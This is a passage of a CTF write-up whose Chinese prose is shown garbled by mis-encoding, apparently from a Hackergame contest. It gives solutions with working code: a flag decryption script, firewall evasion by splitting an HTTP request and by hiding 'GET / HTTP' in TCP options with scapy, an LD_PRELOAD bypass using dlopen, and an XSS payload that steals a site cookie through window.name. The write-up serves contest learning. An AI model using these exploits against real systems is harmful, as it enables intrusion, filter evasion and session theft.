    code_dict += ['nymeh1niwemflcir}ecchaet']  # nymeh1niwemflcir}echaet

    # lä¹‹åï¼Œll / ss / pp / pe / hh ï¼Œåˆå› ä¸º28æ˜¯å³æ‹¬å·ï¼Œæ‰€ä»¥æ˜¯ll
    code_dict += ['a3g7}kidgojernoetllsup?h']  # a3g7}kidgojernoetlsup?h

    # fä¹‹å‰ï¼Œll / ww / we
    code_dict += ['ullw!f5soadrhwnrsnstnoeq']  # ulw!f5soadrhwnrsnstnoeq

    # {ä¹‹å‰ï¼Œcc / tt
    code_dict += ['ctt{l-findiehaai{oveatas']  # ct{l-findiehaai{oveatas

    # gä¹‹å‰ï¼Œ-ä¹‹å‰
    code_dict += ['ty9kxborszstgguyd?!blm-p']  # ty9kxborszstguyd?!blm-p

    print(''.join(code_dict))
    # check_equals(set(len(s) for s in code_dict), {24})
    return ''.join(code_dict)


def decrypt_data(input_codes):
    # retrieve the decrypted data
    code_dict = get_code_dict()
    output_chars = [code_dict[c] for c in input_codes]
    return ''.join(output_chars)


if __name__ == '__main__':
    # check some obvious things
    check_equals('create', 'creat' + 'e')
    check_equals('referrer', 'refer' + 'rer')
    # check the flag
    # nymeh1niwemflcir}echaeta3g7}kidgojernoetlsup?hulw!f5soadrhwnrsnstnoeqct{l-findiehaai{oveatasty9kxborszstguyd?!blm-p
    flag = decrypt_data([
        # f, l, a, g, {
        53, 41, 85, 109, 75,
        # y, o, u, -,
        1, 33, 48, 77,
        # v, e, -
        90, 17, 118,
        # r, 3, c, o, v, e, r, 3, d, -
        36, 25, 13, 89, 90, 3, 63, 25, 31, 77,
        # 7, h, e, -,
        27, 60, 3, 118,
        # a, n, 5,
        24, 62, 54, 61, 25, 63, 77, 36, 5, 32, 60, 67, 113,
        # }
        28])
    print(flag)
    check_equals(flag.index('flag{'), 0)
    check_equals(flag.index('}'), len(flag) - 1)
    # print the flag
    print(flag)

```

`flag{you-ve-r3cover3d-7he-an5w3r-r1ght?}`

## Docker for Everyone

æ‰§è¡Œ`docker run -it --rm -v /flag:/flag alpine`æŒ‚è½½flag

åœ¨é•œåƒä¸­æ‰§è¡Œ`cat /flag`å³å¯

`flag{u5e_r00t1ess_conta1ner_ee4c7abb45_plz!}`

## ğŸª ä½å¸¦å®½æ˜Ÿçƒ
### å°è¯•ç‰›åˆ€
éšä¾¿æ‰¾ä¸€ä¸ªpngå‹ç¼©ç½‘ç«™ï¼Œå‹ç¼©å³å¯

`flag{flatpak_install_curtail_15_linux}`

## ğŸª é«˜é¢‘ç‡æ˜Ÿçƒ

æ ¹æ®å®˜æ–¹æ•™ç¨‹ï¼Œå°†å½•åˆ¶å†…å®¹å…¨éƒ¨è¾“å‡ºï¼š

![5da52f749e4c08fd5b392a86cb678cfe.png](_resources/5da52f749e4c08fd5b392a86cb678cfe.png)
```shell
python3 -m asciinema cat ./asciinema_restore.rec >out.txt
```

ç„¶åå¤„ç†ä¸€ä¸‹ï¼Œå»é™¤è¾“å…¥çš„å­—ç¬¦å’Œæ— æ³•æ˜¾ç¤ºçš„å­—ç¬¦ï¼Œç”¨node.jsè¿è¡Œå³å¯ã€‚

![322cc914ff026b72de53ab3aa48547c2.png](_resources/322cc914ff026b72de53ab3aa48547c2.png)

`flag{y0u_cAn_ReSTorE_C0de_fr0m_asc11nema_3db2da1063300e5dabf826e40ffd016101458df23a371}`


## Komm, sÃ¼sser Flagge


## æˆ‘çš„POST

ç”±äºé˜²ç«å¢™æ‹¦æˆªçš„æ—¶å€™ï¼Œéœ€è¦å®Œæ•´æ£€æµ‹åˆ°`POST`ï¼Œé‚£ä¹ˆï¼Œæˆ‘æŠŠä»–æ‹†å¼€æ¥å‘å°±è¡Œäº†ã€‚

```python
from pwn import *

conn = connect("192.168.23.1", 18080)

if __name__ == '__main__':
    conn.send(b"PO")
    conn.send(b"S")
    conn.send(b"T / HTTP/1.1\r\n")
    conn.send(b"Host: 202.38.93.111:18080\r\n")
    conn.send(b"Content-Length: 104\r\n"
              b"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
              b"...\r\n"
              b"\r\n")

    print(conn.recv())

```

`flag{ea5Y_sPl1tt3r_a075cc30d0}`

## æˆ‘çš„P

> å¯èƒ½æ˜¯éé¢„æœŸè§£

è§£é¢˜æ–¹å¼åŒ`æˆ‘çš„POST`

```python
from pwn import *

conn = connect("202.38.93.111", 18081)

if __name__ == '__main__':
    conn.send(b"PO")
    conn.send(b"S")
    conn.send(b"T / HTTP/1.1\r\n")
    conn.send(b"Host: 202.38.93.111:18081\r\n")
    conn.send(b"Content-Length: 104\r\n"
              b"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
              b"...\r\n"
              b"\r\n")

    print(conn.recv())

```
`flag{r3s3rv3d_bYtes_46847b419a}`


### æˆ‘çš„GET

è¿™æ˜¯ä¸€é“ç›¸å½“æœ‰æ„æ€çš„é¢˜ç›®ã€‚

æ ¹æ®è®¡ç®—æœºç½‘ç»œçŸ¥è¯†ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œåœ¨å»ºç«‹TCPè¿æ¥æ—¶ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ã€‚è€Œåœ¨ç¬¬ä¸€æ¬¡æ¡æ‰‹æ—¶ï¼Œä¼šå‘é€ä¸€ä¸ª`SYN`åŒ…ï¼Œè¿™ä¸ªåŒ…æœ¬èº«æ˜¯ä¸åŒ…å«ä»»ä½•æ•°æ®çš„ã€‚

è€Œç¬¬ä¸‰é—®çš„Iptablesè§„åˆ™ä»…å…è®¸åŒ…å«`GET / HTTP`çš„æµé‡é€šè¿‡ç«¯å£18082ã€‚å½“å°è¯•ä½¿ç”¨å¸¸ç”¨å·¥å…·å»ºç«‹è¿æ¥æ—¶ï¼Œé¦–å…ˆä¼šå‘é€ä¸€ä¸ª`TCP SYN`åŒ…æ¥å»ºç«‹è¿æ¥ï¼Œè€Œè¿™ä¸ªåŒ…è‚¯å®šä¸åŒ…å«`GET / HTTP`ï¼Œå› æ­¤ï¼ŒIptablesä¼šæ ¹æ®æ‚¨çš„è§„åˆ™æ‹’ç»è¿™ä¸ªè¿æ¥ã€‚

äºæ˜¯æˆ‘å¼€å§‹äº†æœ¬åœ°è°ƒè¯•

**æœ€å¼€å§‹çš„æƒ³æ³•ï¼š**
æ—¢ç„¶å¦‚æ­¤ï¼Œåœ¨Headeré‡ŒåŒ…å«`A: GET / HTTP`ä¸å°±å¯ä»¥äº†å—ï¼Ÿäº‹å®è¯æ˜ï¼Œæˆ‘è¿˜æ˜¯Too Naiveäº†ï¼Œiptablesçš„0åˆ°50å­—èŠ‚æŒ‡çš„æ˜¯TCPåŒ…çš„0-50å­—èŠ‚ï¼Œè€Œä¸æ˜¯TCPçš„payloadï¼Œæ‰€ä»¥å¦‚æœåœ¨`POST / HTTP/1.1\r\n`åé¢åŠ çš„è¯ï¼Œå®é™…ä¸Šç©ºé—´æ˜¯ä¸å¤Ÿçš„ã€‚

**æ¥ä¸‹æ¥çš„æƒ³æ³•ï¼š**
æ—¢ç„¶ä¸èƒ½åŒ…å«åœ¨`Payload`é‡Œï¼Œé‚£ä¹ˆèƒ½å¦æ”¾åœ¨TCPåŒ…å¤´å‘¢ï¼Ÿå¤§æŠµæ˜¯å¯ä»¥çš„ã€‚ä½†æˆ‘æ–¹å‘å¼„é”™äº†ï¼ŒèŠ±äº†å¤§æŠŠçš„æ—¶é—´åœ¨é€šè¿‡ç»„åˆ`SEQ`ã€`ACK`ã€`FLAG`ï¼Œæ‹¼æ¥å®ç°`GET / HTTP`ä¸Šäº†ï¼Œå¯¼è‡´æœ€åï¼Œå‘å‡ºå»çš„åŒ…ç›´æ¥è¢«`RST`äº†ï¼ˆå…¶å®è¿™æƒ³æƒ³ä¹Ÿæ˜¯ç†æ‰€å½“ç„¶çš„ï¼‰ã€‚

åŒæ—¶ï¼Œåœ¨å‘é€ç»™çº¿ä¸Šç¯å¢ƒçš„æ—¶å€™ï¼ŒWindowsçš„scapyè¿˜ä¸€ç›´å‘ä¸å‡ºå»ï¼Œä¹Ÿæ‰¾ä¸åˆ°åŸå› ï¼Œå½“æ—¶å·²å‡Œæ™¨5ç‚¹ï¼Œåªå¥½ä½œç½¢ã€‚

**ç¿Œæ—¥ï¼š**
ä¸‹åˆé†’æ¥åï¼Œèººåœ¨åºŠä¸Šä¸€ç›´åœ¨æ€è€ƒç©¶ç«Ÿæ˜¯å“ªé‡Œæé”™äº†ã€‚çªç„¶æƒ³èµ·æˆ‘è¿˜æœ‰ä¸€å°Macï¼Œæƒ³ç€æ¢ä¸ªç³»ç»Ÿè¯•è¯•çœ‹ã€‚æ¢äº†ç³»ç»Ÿä»¥åï¼Œè™½ç„¶ä»£ç å¤„çš„`response`è¿˜æ˜¯ä¸€å¦‚æ—¢å¾€çš„æ­»å¯‚ï¼Œä½†æ˜¯å¥½åœ¨`wireshark`èƒ½æŠ“åˆ°å“åº”äº†ï¼Œè¿™ä¸‹å°±æœ‰åŠæ³•ç»§ç»­è°ƒè¯•äº†ã€‚

åœ¨å¤ç°äº†ä¸€ä¸‹æ˜¨å¤©çš„æ€è·¯æ— æœåï¼Œæˆ‘æœ‰æ€è€ƒäº†è¯·æ±‚èµ°ç§ã€URIå†…è®¾ç½®`POST /GET / HTTP/1.1`ç­‰å„ç§æ–¹æ³•ï¼Œä½†éƒ½æ²¡æœ‰æ•ˆæœã€‚

ä¸€ç­¹è«å±•ä¹‹æ—¶ï¼Œé‡æ–°ç¿»çœ‹äº†ä¸€éè®¡ç®—æœºç½‘ç»œæ•™æï¼ŒçŒ›ç„¶å‘ç°`TCP`åŒ…å…¶å®æœ‰ä¸€ä¸ªä¿ç•™çš„`OPTIONS`éƒ¨åˆ†ï¼ï¼ˆä¹‹å‰æ€ä¹ˆæ²¡å‘ç°ï¼Œçœ‹æ¥åŠå¤œåšé¢˜æ•ˆç‡æ˜¯ä¼šä¸‹é™å•Šï¼‰

è±ç„¶å¼€æœ—ï¼Œå®é™…ä¸Šï¼Œåªéœ€è¦åœ¨`OPTIONS`é‡Œè®¾ç½®`GET / HTTP`ä¾¿å¯ã€‚äºæ˜¯ä¾¿æœ‰äº†ä¸‹é¢çš„ä»£ç ï¼š

```python
import random
import sys

from Crypto.Util.number import bytes_to_long, long_to_bytes
from scapy.all import send, Raw
from scapy.layers.inet import TCP, IP, ICMP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sr, sr1, srp1, sendp
from scapy.volatile import RandShort

token = "..."


# p = sr1(IP(dst='192.168.23.1') / ICMP())
# if p:
#     p.show()


def getAvailablePort():
    import socket
    s = socket.socket()
    s.bind(("", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def send_custom_packet(dst_ip, dst_port, payload):
    # åˆ›å»ºIPåŒ…
    ip = IP(dst=dst_ip)
    # åˆ›å»ºSYNåŒ…

    SEQ_BYTE = bytes_to_long(b'GET ') - 1
    ACK_BYTE = bytes_to_long(b'/ HT') - 1

    sport = getAvailablePort()
    print(sport)

    syn = TCP(sport=sport, dport=dst_port, flags='S', seq=SEQ_BYTE, ack=ACK_BYTE, reserved=2)
    syn_ack = sr1(ip / syn / "GET / HTTP")
    my_ack = syn_ack.seq + 1
    my_seq = syn.seq + 1
    push = TCP(sport=sport, dport=dst_port, flags='AP', seq=my_seq, ack=my_ack, reserved=2,
               options=[(255, b"GET / HTTP")])
    response = sr1(ip / push / payload)
    # å…³é—­è¿æ¥
    fin = TCP(sport=sport, dport=dst_port, flags='FA', seq=my_seq + 1, ack=my_ack + 1)
    send(ip / fin / "GET / HTTP")
    return response


if __name__ == "__main__":
    dst_ip = "192.168.23.1"
    dst_port = 18082
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: 123\r\n"
        "Content-Length: 104\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "\r\n"
        f"{token}\r\n"
        "\r\n")
    response = send_custom_packet(dst_ip, dst_port, payload)
    print(response)
    if response and Raw in response:
        print(response[Raw].load)
    else:
        print("No response received.")
```


è™½ç„¶ä¾æ—§æ”¶ä¸åˆ°`response`ï¼Œä½†æ˜¯é—®é¢˜ä¸å¤§ï¼Œå› ä¸ºæŠ“åŒ…æŠ“åˆ°äº†ï¼š
![e747aac20a88879ad8f2f0252ffd7e2d.png](_resources/e747aac20a88879ad8f2f0252ffd7e2d.png)

`flag{1p_OoOpt10ns_ac178b7cd8}`


## ğŸª æµå¼æ˜Ÿçƒ

ç”±äºè¢«è£æ‰äº†éƒ¨åˆ†åƒç´ ï¼Œå¯¼è‡´å¾ˆéš¾ç²¾å‡†çš„æ‰¾åˆ°å®ƒçš„å®½é«˜

å˜›ï¼Œä¸ç®¡æ€ä¹ˆè¯´ï¼Œå…ˆçˆ†ç ´ä¸€ä¸‹ï¼ˆæœ¬æ¥æƒ³é€šè¿‡æ±‚ç´ å› å­æ¥å‡å°‘å·¥ä½œé‡çš„ï¼‰ï¼š
```python
import cv2
import numpy as np
import os


# def get_divisors(n):
#     divisors = []
#     for i in range(1, int(n ** 0.5) + 1):
#         if n % i == 0:
#             divisors.append(i)
#             if i != n // i:
#                 divisors.append(n // i)
#     return divisors


def recover_first_frame(bin_file, output_folder):
    # è¯»å–äºŒè¿›åˆ¶æ–‡ä»¶å†…å®¹
    data = np.fromfile(bin_file, dtype=np.uint8)

    # ç”±äºæ¯ä¸ªåƒç´ ç”±3ä¸ªå…ƒç´ ï¼ˆRGBï¼‰ç»„æˆï¼Œå› æ­¤æˆ‘ä»¬è¦é™¤ä»¥3ä»¥è·å–æ€»çš„åƒç´ æ•°é‡
    total_pixels = data.shape[0] // 3

    for width in range(50, 641):
        for height in range(300, 301):
            frame_data = data[:width * height * 3].reshape((height, width, 3))

            filename = os.path.join(output_folder, f"frame_{width}x{height}.png")
            cv2.imwrite(filename, frame_data)


if __name__ == "__main__":
    output_folder = "recovered_frames"
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)
    recover_first_frame('video.bin', output_folder)

```

![188d5e62fdfca01c9660ea456ccdcb04.png](_resources/188d5e62fdfca01c9660ea456ccdcb04.png)

å¯ä»¥çœ‹åˆ°ï¼Œåœ¨å®½åº¦ä¸º213æ—¶ä¼¼ä¹æ¯”è¾ƒæ¸…æ™°äº†ã€‚

äºæ˜¯ç¼–å†™è„šæœ¬ï¼Œé«˜åº¦é€‰ä¼˜ï¼Œæ¢å¤è§†é¢‘ä¸ºmp4
```python

import cv2
import numpy as np


def recover_video(bin_file, output_file):
    # è¯»å–äºŒè¿›åˆ¶æ–‡ä»¶çš„å†…å®¹
    data = np.fromfile(bin_file, dtype=np.uint8)

    # è·å–åŸå§‹å¸§æ•°ï¼Œå®½åº¦å’Œé«˜åº¦
    # 135146688 = 2^6 * 3 * 409 * 1721

    width = 213  # 640
    best_height = 0
    delta = 10e9
    total_pixels = data.shape[0] // 3

    for height in range(200, 500):
        frame_count = total_pixels // (width * height)

        if 135146688 - frame_count * width * height * 3 < delta:
            delta = 135146688 - frame_count * width * height * 3
            best_height = height

    height = best_height
    frame_count = total_pixels // (width * height)

    print(f"width: {width}, height: {height}, frame_count: {frame_count}, delta: {delta}")

    data = data[:frame_count * width * height * 3]

    # é‡æ–°å¡‘å½¢ä¸º(å¸§æ•°, é«˜åº¦, å®½åº¦, 3)
    video_data = data.reshape((frame_count, height, width, 3))

    # åˆ›å»ºMP4è§†é¢‘å†™å…¥å™¨
    fourcc = cv2.VideoWriter_fourcc(*'MP4V')
    out = cv2.VideoWriter(output_file, fourcc, 30.0, (width, height))

    for i in range(frame_count):
        out.write(video_data[i])
    out.release()


if __name__ == "__main__":
    # è¿™é‡Œçš„å®½åº¦å’Œé«˜åº¦åº”è¯¥æ˜¯åŸè§†é¢‘çš„å®½åº¦å’Œé«˜åº¦ï¼Œä½ å¯èƒ½éœ€è¦äº‹å…ˆçŸ¥é“è¿™äº›å€¼
    recover_video('video.bin', 'recovered.mp4')

```

è§†é¢‘å¦‚ä¸‹ï¼š
![77f1ecf5bab65e73252f25ea3b54c03a.png](_resources/77f1ecf5bab65e73252f25ea3b54c03a.png)
![8fb3f9cc7682878ff057128fd8e7dd32.png](_resources/8fb3f9cc7682878ff057128fd8e7dd32.png)

`flag{it-could-be-easy-to-restore-video-with-haruhikage-even-without-metadata-0F7968CC}`


## ä¸ºä»€ä¹ˆè¦æ‰“å¼€ /flag ğŸ˜¡

### LD_PRELOAD, love!

ä½¿ç”¨dlopenæ‰“å¼€æœªè¢«ä¿®æ”¹è¿‡çš„libcå³å¯ã€‚
```c
#include <stdio.h>
#include <dlfcn.h>

int main() {
    // ä½¿ç”¨dlopenæ‰“å¼€libc.so.6
    void *handle = dlopen("libc.so.6", RTLD_LAZY);
    if (!handle) {
        fprintf(stderr, "dlopen error: %s\n", dlerror());
        return 1;
    }

    FILE *(*original_fopen)(const char*, const char*);
    *(void **) (&original_fopen) = dlsym(handle, "fopen");
    
    if (!original_fopen) {
        fprintf(stderr, "dlsym error: %s\n", dlerror());
        dlclose(handle);
        return 1;
    }

    FILE *f = original_fopen("flag", "r");
    if (!f) {
        perror("Error opening file");
        dlclose(handle);
        return 1;
    }

    char data[200];
    fscanf(f, "%s", data);
    printf("%s", data);

    fclose(f);
    dlclose(handle);
    return 0;
}
```

`flag{nande_ld_preload_yattano_03fc163e10}`


## æ˜Ÿç•Œå¼‚é€”

ç¬¬ä¸€ç»„ï¼Œæ»¡è¶³æ¡ä»¶å³å¯ï¼ˆè®°å¾—æ˜¯`not s`ï¼‰ï¼š
![fda6ce9c64b8b6537c38f8b4ff632816.png](_resources/fda6ce9c64b8b6537c38f8b4ff632816.png)

`10100101`

ç¬¬äºŒç»„ï¼š
![464112f4161b20d438e66970c82759ca.png](_resources/464112f4161b20d438e66970c82759ca.png)
![4fb43f67db31680fd842d98cde84d374.png](_resources/4fb43f67db31680fd842d98cde84d374.png)

é¦–å…ˆå¯ä»¥æ¨ç®—å‡ºsw1å’Œsw6è¦ç­‰äº1ï¼Œæ¥ç€é€šè¿‡ifè¯­å¥å¯çŸ¥ï¼Œéœ€è¦æ‹¼æ¥å‡ºæ¥çš„äºŒè¿›åˆ¶æ•°æ˜¯ä¸€ä¸ªå¹³æ–¹æ•°ï¼Œsw1=128ï¼Œsw6=4ï¼Œæ‰€ä»¥åªèƒ½æ˜¯14çš„å¹³æ–¹196=128+64+4ï¼Œå³`11000100`

ç¬¬å››ç»„ï¼šçº¯å‡­è¿æ°”çŒœå‡ºæ¥çš„
![1b6f02f652077b8408d37f7ec74080bb.png](_resources/1b6f02f652077b8408d37f7ec74080bb.png)

`01110111`

ç¬¬ä¸‰ç»„ï¼š
å®Œå…¨ä¸ç†Ÿæ‚‰æ¸¸æˆï¼Œä¹Ÿåªèƒ½é çŒœ
![e41124e82d74bb0e3714424423c1e92b.png](_resources/e41124e82d74bb0e3714424423c1e92b.png)
![f6c457dbf2ded67a36a7c92cbb3961a1.png](_resources/f6c457dbf2ded67a36a7c92cbb3961a1.png)
çº¢æ¡†ä¸‰ä¸ªä¸èƒ½æ‰“å¼€ï¼Œsw3ä¸º0æ—¶ï¼Œååº”å †å¯åŠ¨ï¼Œsw8ä¸€å®šè¦ä¸sw9ä¸€è‡´ï¼Œå¦åˆ™å°±ä¼šè‡ªçˆ†ï¼Œå…¶ä»–çš„è¦æ‰“å¼€ã€‚
æ‰€ä»¥æ˜¯`10001100`

ç»„åˆä¸€ä¸‹ï¼š`10100101110001001000110001110111`

`flag{B34WarE_0f_#xp1osi0N_da2120aad4}`


## å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹  2.0

ä¸ºäº†å®ç°è·¨åŸŸä¼ è¾“æ•°æ®ï¼Œä¼ ç»Ÿçš„æ‰“å¼€å¼¹çª—ç„¶åè¯»å–å¼¹çª—å†…å®¹æ˜¯è¡Œä¸é€šçš„ï¼Œå› ä¸ºç”±äºä¸æ˜¯åŒä¸€åŸŸåï¼Œæµè§ˆå™¨ä¼šç¦æ­¢è¯»å–å¼¹çª—ä¸­çš„å†…å®¹ã€‚

ä½†æ˜¯ï¼Œåœ¨åŒä¸€ä¸ªé¡µé¢ä¸­ï¼Œ`window.name`æ˜¯å…±äº«çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å°†éœ€è¦ä¼ è¾“çš„æ•°æ®å­˜åœ¨`window.name`ä¸­ï¼ˆç®€å†™å°±æ˜¯`name`ï¼‰ï¼Œç„¶åç”±æˆ‘ä»¬è‡ªç¼–å†™çš„ç½‘ç«™æ¥è¯»å–ã€‚

é¦–å…ˆæˆ‘ä»¬å‘ç°ï¼Œè¯„è®ºå­˜åœ¨XSSæ³¨å…¥çš„å¯èƒ½æ€§ï¼Œå³è¯„è®ºæ˜¯ç®€å•çš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬åªéœ€æå‰ç»“æŸå­—ç¬¦ä¸²å³å¯ç¼–å†™è‡ªå·±çš„ä»£ç ã€‚

æˆ‘ä»¬éœ€è¦å¾—åˆ°çš„æ˜¯ç½‘ç«™çš„`cookie`ï¼Œæ‰€ä»¥å¯ä»¥ç”¨`name=document.cookie`å°†cookieæ”¾åœ¨`name`ä¸­ï¼Œä½†æ˜¯ç”±äºè¯„è®ºé•¿åº¦åªæœ‰`25`ï¼ŒåŒæ—¶ç¦ç”¨äº†`.`ï¼Œå› æ­¤ï¼Œ`"[name=document["cookie"]+"`å¤ªé•¿äº†ï¼Œæ²¡æ³•å‘é€ï¼Œä¸è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥å°†`cookie`æ”¾åœ¨`name`é‡Œï¼Œç„¶åæäº¤`"[name=document[name]]+"`ï¼Œè¿™æ ·å°±åˆšåˆšå¥½äº†ã€‚

æ¥ä¸‹æ¥ï¼Œåªéœ€è¦æ§åˆ¶æ–°å¼€çš„é¡µé¢è®¿é—®æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„ç½‘ç«™ï¼Œç„¶åæäº¤å¾—åˆ°çš„flagå°±å¯ä»¥å•¦ã€‚ï¼ˆä¸è¿‡è®°å¾—å…ˆbase64ç¼–ç ï¼Œç„¶ååˆ‡ç‰‡æäº¤ï¼‰

ä¸‹é¢æ˜¯HTMLä»£ç ï¼š
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<form action="http://web/result" method="post">
    <input id="flag" name="comment" type="text"/>
    <input id="submit" type="submit" value="æäº¤"/>
</form>


<script>
    const stage = new URLSearchParams(window.location.search).get('stage');

    // ç¬¬ä¸€é˜¶æ®µï¼Œè®¾ç½®è‡ªå·±çš„nameä¸ºcookie
    if (stage === "1") {
        window.name = "cookie";
        document.getElementById("flag").value = `"[name=document[name]]+"`;
        document.getElementById("submit").click();
    }

    // ç¬¬äºŒé˜¶æ®µï¼Œå°†å½“å‰çš„nameæäº¤åˆ°æœåŠ¡å™¨
    if (stage === "2") {
        const data = btoa(window.name); // 76
        document.getElementById("flag").value = data.slice(50, 75);
        document.getElementById("submit").click();
    }

    // ç¬¬é›¶é˜¶æ®µï¼Œä½œä¸ºå®¿ä¸»é¡µé¢ï¼Œæ–°å¼€ä¸€ä¸ªçª—å£ï¼Œå±•ç¤ºstage=1çš„é¡µé¢
    if (!stage) {
        let newWindow = window.open(location.href + "?stage=1");
        setTimeout(() => {
            newWindow.location.replace(location.href + "?stage=2")
        }, 1000)
    }
</script>
</body>
</html>


EOF
```

æœ€åæ‹¼æ¥å‡ºæ¥çš„flagç”¨`urllib.parse.unquote_plus`å»è½¬ä¹‰ï¼Œä¾¿å¯ä»¥æ‹¿åˆ°flagã€‚

`flag{x55_still_alive&=>_< _a765e18e3c}`